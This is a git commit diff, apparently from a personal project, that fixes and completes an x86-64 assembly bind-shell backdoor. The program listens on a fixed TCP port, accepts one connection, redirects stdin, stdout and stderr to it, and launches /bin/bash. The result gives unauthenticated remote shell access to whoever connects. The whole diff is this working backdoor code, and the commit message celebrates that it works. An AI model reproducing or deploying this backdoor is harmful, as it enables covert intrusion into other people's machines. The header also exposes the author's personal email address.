7ae99ff82d0a8b0592de2c5a6efa7b4e36b81779
Bogdan Minzar <bogdan.minzar@gmail.com>
2019-05-26 22:42:06 +0300

    IT WORKS WOW SO DOGE

--- backdoor/backdoor_asm.s
+++ backdoor/backdoor_asm.s
@@ -1,19 +1,19 @@
 .include "defs.h"
+.include "app_defs.h"
 
-NULL = 0
-SIZEOF_UINT_16_T = 2
-SIZEOF_STRUCT_SOCKADDR = 16
-
-ACCEPTED_CONNECTIONS = 1
-BACKDOOR_PORT_HTONS = 0xE307
-
+.text
+.globl	sock_address
+.bss
+.align 16
+.type	sock_address, @object
+.size	sock_address, 16
 
 sock_address:
 	.zero	16
 	.comm	sock,4,4
 	.comm	sock_fd,4,4
 	.globl	bash
-	.section	.data
+	.section	.rodata
 
 .bash_str_data:
 	.string	"/bin/bash"
@@ -22,7 +22,7 @@ sock_address:
 	.type	bash, @object
 	.size	bash, 8
 
-bash_ptr:
+bash:
 	.quad	.bash_str_data
 	.text
 	.globl	main
@@ -32,63 +32,52 @@ bash_ptr:
 
 .global _start
 _start:
-	# dynamic stack alloc. maybe remove
-#	pushq	%rbp
-#	movq	%rsp, %rbp
-
 	movq    $SYS_SOCKET, %rax
 	movl	$AF_INET, %edi
 	movl	$SOCK_STREAM, %esi
 	movl	$IPPROTO_TCP, %edx
 	syscall
+	movl	%eax, sock(%rip)
 
 	movq	$SYS_BIND, %rax
-	movl	%eax, sock(%rip)
 	movw	$AF_INET, sock_address(%rip)
 	movw	$BACKDOOR_PORT_HTONS, sock_address+SIZEOF_UINT_16_T(%rip)
-	movl	sock(%rip), %eax
+	movl    sock(%rip), %edi
 	movl	$SIZEOF_STRUCT_SOCKADDR, %edx
 	movl	$sock_address, %esi
-	movl	%eax, %edi
 	syscall
 
 	movq    $SYS_LISTEN, %rax
-	movl	sock(%rip), %eax
-	movl	%eax, %edi
+	movl    sock(%rip), %edi
 	movl	$ACCEPTED_CONNECTIONS, %esi
 	syscall
 
 	movq	$SYS_ACCEPT, %rax
-	movl	sock(%rip), %eax
+	movl	sock(%rip), %edi
 	movl	$NULL, %edx
 	movl	$NULL, %esi
-	movl	%eax, %edi
 	syscall
-
-	movq	$SYS_DUP2, %rax
 	movl	%eax, sock_fd(%rip)
-	movl	sock_fd(%rip), %eax
+
+	movq	$SYS_DUP2, %rax
+	movl	sock_fd(%rip), %edi
 	movl	$STDIN, %esi
-	movl	%eax, %edi
 	syscall
 
 	movq	$SYS_DUP2, %rax
-	movl	sock_fd(%rip), %eax
+	movl	sock_fd(%rip), %edi
 	movl	$STDOUT, %esi
-	movl	%eax, %edi
 	syscall
 
 	movq	$SYS_DUP2, %rax
-	movl	sock_fd(%rip), %eax
+	movl	sock_fd(%rip), %edi
 	movl	$STDERR, %esi
-	movl	%eax, %edi
 	syscall
 
 	movq	$SYS_EXECVE, %rax
-	movq	bash_ptr(%rip), %rax
-	movl	$NULL, %edx
-	movl	$NULL, %esi
-	movq	%rax, %rdi
+	movq 	bash(%rip), %rdi
+	movq	$NULL, %rsi
+	movq	$NULL, %rdx
 	syscall
 
 	movq $SYS_EXIT, %rax
